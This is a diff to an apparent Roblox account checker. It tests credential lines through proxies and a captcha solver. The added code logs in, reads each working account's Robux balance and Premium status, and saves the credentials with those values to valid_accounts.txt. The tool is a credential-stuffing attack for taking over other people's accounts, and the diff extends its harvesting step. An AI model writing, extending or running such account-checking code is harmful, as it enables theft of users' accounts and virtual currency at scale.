@@ -106,7 +106,22 @@ def check_account_task(account_line, proxy_dict):
 
             if solve_result.get('status') == 'success' and session.is_logged_in:
                 update_stats("captcha")
+                update_stats("valid")
                 add_log(f"✅ {username}: Captcha solved & logged in!", "green")
+                
+                # Get Info for captcha-solved accounts
+                info = session.get_account_info()
+                robux = info.get("robux", 0)
+                premium = info.get("premium", False)
+                
+                # Save
+                result_line = f"{account_line.strip()} | Robux: {robux} | Premium: {premium}"
+                with open("valid_accounts.txt", "a", encoding="utf-8") as f:
+                    f.write(result_line + "\n")
+                
+                msg = f"✅ {username} | Robux: {robux}"
+                add_log(msg, "green")
+                return
             elif solve_result.get('status') == 'invalid':
                 update_stats("invalid")
                 add_log(f"❌ {username}: Invalid credentials (post-captcha)", "red")
